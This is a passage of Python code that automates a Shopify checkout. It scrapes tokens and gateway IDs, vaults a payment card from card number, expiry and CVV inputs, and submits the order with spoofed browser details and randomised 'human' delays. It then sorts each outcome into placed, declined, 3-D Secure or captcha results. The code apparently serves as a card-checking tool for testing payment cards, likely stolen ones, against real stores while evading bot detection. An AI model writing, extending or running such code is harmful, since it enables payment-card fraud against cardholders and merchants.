                        cheapest = min(shipping_rates, key=lambda r: float(r.get('price', 999)))
                        rate_name = cheapest.get('name', 'Standard Shipping')
                        rate_price_raw = cheapest.get('price', '0.00')
                        shipping_rate_handle = cheapest.get('id') or f'shopify-{quote_plus(rate_name)}-{rate_price_raw}'
                        print(f'[STEP6] Rate: {rate_name} @ {rate_price_raw}', file=sys.stderr)
                        break
                    else:
                        print(f'[STEP6] No rates yet, waiting... attempt {_attempt+1}', file=sys.stderr)
                        time.sleep(1.5)
                        continue
                except Exception as e:
                    print(f'[STEP6] rates parse error: {e}', file=sys.stderr)
                    break
            elif rates_resp.status_code == 202:
                time.sleep(1.5)
                continue
            else:
                print(f'[STEP6] rates HTTP {rates_resp.status_code}', file=sys.stderr)
                break

        if not shipping_rate_handle:
            shipping_rate_handle = 'shopify-Free+Shipping-0.00'
            print('[STEP6] Using free shipping fallback', file=sys.stderr)

        human_delay(0.6, 1.2)

        # ============================================================
        # STEP 7: GET shipping page -> fresh auth_token
        # ============================================================
        ship_page_resp = retry_on_429(
            lambda: session.get(
                shipping_page_url,
                headers=bh_browse(referer=checkout_url_base),
                timeout=20,
                allow_redirects=True,
                cookies=_cookies,
            ),
            step_name="shipping_page",
        )
        absorb_cookies(ship_page_resp)

        shipping_html = ship_page_resp.text if ship_page_resp.status_code == 200 else checkout_html
        auth_token_ship = extract_authenticity_token(shipping_html) or authenticity_token

        # ============================================================
        # STEP 8: POST shipping method selection
        # ============================================================
        ship_payload = urlencode({
            '_method': 'patch',
            'authenticity_token': auth_token_ship,
            'previous_step': 'shipping_method',
            'step': 'payment_method',
            'checkout[shipping_rate][id]': shipping_rate_handle,
            'button': '',
        })

        ship_headers = bh_browse(referer=shipping_page_url)
        ship_headers['Content-Type'] = 'application/x-www-form-urlencoded'
        ship_headers['Origin'] = ourl

        ship_submit_resp = retry_on_429(
            lambda: session.post(
                checkout_url_base,
                headers=ship_headers,
                data=ship_payload,
                timeout=25,
                allow_redirects=False,
                cookies=_cookies,
            ),
            step_name="shipping_submit",
        )
        absorb_cookies(ship_submit_resp)

        payment_page_url = checkout_url_base + '?step=payment_method'
        if ship_submit_resp.status_code in (301, 302, 303):
            loc = ship_submit_resp.headers.get('Location', '')
            if loc:
                if not loc.startswith('http'):
                    loc = urljoin(ourl, loc)
                payment_page_url = loc

        print(f'[STEP8] Shipping submitted status={ship_submit_resp.status_code}', file=sys.stderr)
        human_delay(0.8, 1.5)

        # ============================================================
        # STEP 9: GET payment page -> gateway_id + auth_token
        # ============================================================
        pay_page_resp = retry_on_429(
            lambda: session.get(
                payment_page_url,
                headers=bh_browse(referer=shipping_page_url),
                timeout=20,
                allow_redirects=True,
                cookies=_cookies,
            ),
            step_name="payment_page",
        )
        absorb_cookies(pay_page_resp)

        if pay_page_resp.status_code not in (200,):
            return False, f"PAYMENT_PAGE_FAILED: HTTP {pay_page_resp.status_code}", gateway, total_price, currency

        payment_html = pay_page_resp.text
        auth_token_pay = extract_authenticity_token(payment_html) or auth_token_ship
        gateway_id = extract_gateway_id(payment_html)

        _pp2, _pc2 = extract_total_price(payment_html)
        if float(_pp2) > 0:
            total_price = _pp2
            currency = _pc2

        if not gateway_id:
            m = re.search(r'(?:gateway|payment)[^0-9]{0,30}(\d{6,})', payment_html, re.IGNORECASE)
            if m:
                gateway_id = m.group(1)

        print(f'[STEP9] gateway_id={gateway_id} auth_token={auth_token_pay[:20]}... price={total_price} {currency}', file=sys.stderr)
        human_delay(0.5, 1.2)

        # ============================================================
        # STEP 10: Vault card -> get session_id
        # ============================================================
        try:
            vault_session_id = tokenize_card_legacy(cc, month, year, cvv, session, profile)
        except RuntimeError as e:
            return False, f"VAULT_FAILED: {e}", gateway, total_price, currency

        print(f'[STEP10] vault_session_id={str(vault_session_id)[:20]}...', file=sys.stderr)
        human_delay(0.3, 0.8)

        # ============================================================
        # STEP 11: POST payment form (complete=1)
        # ============================================================
        try:
            price_cents = int(float(total_price) * 100)
        except Exception:
            price_cents = 0

        pay_form = {
            '_method': 'patch',
            'authenticity_token': auth_token_pay,
            'previous_step': 'payment_method',
            'step': '',
            's': vault_session_id,
            'checkout[credit_card][vault]': 'false',
            'checkout[different_billing_address]': 'false',
            'checkout[total_price]': str(price_cents),
            'complete': '1',
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][browser_width]': '1280',
            'checkout[client_details][browser_height]': '800',
            'checkout[client_details][browser_tz]': '-300',
            'checkout[client_details][browser_color_depth]': '24',
            'button': '',
        }
        if gateway_id:
            pay_form['checkout[payment_gateway]'] = gateway_id

        pay_headers = bh_browse(referer=payment_page_url)
        pay_headers['Content-Type'] = 'application/x-www-form-urlencoded'
        pay_headers['Origin'] = ourl

        pay_submit_resp = retry_on_429(
            lambda: session.post(
                checkout_url_base,
                headers=pay_headers,
                data=urlencode(pay_form),
                timeout=30,
                allow_redirects=False,
                cookies=_cookies,
            ),
            step_name="payment_submit",
        )
        absorb_cookies(pay_submit_resp)

        print(f'[STEP11] Payment submitted status={pay_submit_resp.status_code}', file=sys.stderr)

        # 405 = new checkout-web SPA (form POST not accepted)
        if pay_submit_resp.status_code == 405:
            return False, "CHECKOUT_FLOW_UNSUPPORTED: Store uses new Shopify checkout (form POST rejected)", gateway, total_price, currency

        # Inline result check on 200
        if pay_submit_resp.status_code == 200:
            body = pay_submit_resp.text
            # Strict check - avoid false positives from extension URLs in checkout-web SPA
            if (re.search(r'<title>[^<]*thank you[^<]*</title>', body, re.IGNORECASE)
                    or re.search(r'<h[12][^>]*>[^<]*thank you[^<]*</h[12]>', body, re.IGNORECASE)
                    or 'Your order is confirmed' in body):
                return True, 'ORDER_PLACED', gateway, total_price, currency
            if 'card_declined' in body or 'Your card was declined' in body:
                return False, _extract_legacy_error(body) or 'CARD_DECLINED', gateway, total_price, currency
            if 'three_d_secure' in body or 'action_required' in body:
                return True, '3DS_REQUIRED', gateway, total_price, currency
            if 'captcha' in body.lower():
                return False, 'CAPTCHA_REQUIRED', gateway, total_price, currency
            # 405 = new checkout-web, form POSTs not accepted (all modern Shopify stores)
            if pay_submit_resp.status_code == 405:
                pass  # fall through to poll

        # Get processing URL from redirect
        processing_url = None
        if pay_submit_resp.status_code in (301, 302, 303):
            loc = pay_submit_resp.headers.get('Location', '')
            if loc:
                if not loc.startswith('http'):
                    loc = urljoin(ourl, loc)
                processing_url = loc

        if not processing_url:
            processing_url = checkout_url_base + '/processing'

        human_delay(0.5, 1.0)

        # ============================================================
        # STEP 12: Poll /processing
        # ============================================================
        return _poll_processing(
            processing_url=processing_url,
            checkout_url=checkout_url_base,
            ourl=ourl,
            session=session,
            profile=profile,
            _cookies=_cookies,
            gateway=gateway,
            total_price=total_price,
            currency=currency,
        )

    except RuntimeError as e:
        msg = str(e).lower()
        if any(k in msg for k in ['connection', 'timeout', 'ssl', 'dns', 'network']):
            return False, f'connection_error: {e}', gateway, total_price, currency
        return False, f'checkout_page_failed: {e}', gateway, total_price, currency
    except Exception as e:
        return False, f'ERROR: {type(e).__name__}: {str(e)[:200]}', gateway, total_price, currency
